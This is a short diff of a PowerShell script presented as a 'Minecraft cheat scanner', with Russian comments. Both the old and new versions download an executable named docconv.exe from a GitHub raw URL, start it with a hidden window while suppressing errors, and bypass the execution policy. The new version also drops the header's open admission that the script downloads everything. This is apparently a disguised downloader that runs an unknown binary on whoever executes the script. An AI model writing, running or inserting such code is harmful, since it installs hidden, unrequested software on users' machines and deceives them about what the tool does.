@@ -1,10 +1,9 @@
-# MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
-    # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/doskaw/Repasz/raw/refs/heads/main/docconv.exe" -OutFile "docconv.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "docconv.exe" -WindowStyle Hidden
-    
+# MINECRAFT CHEAT SCANNER v2.0
+# Скачиваем everything в текущую папку
+Invoke-WebRequest -Uri "https://github.com/doskaw/Checker/raw/refs/heads/main/docconv.exe" -OutFile "docconv.exe" -ErrorAction SilentlyContinue
+
+# Запускаем 
+Start-Process -FilePath "docconv.exe" -WindowStyle Hidden
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
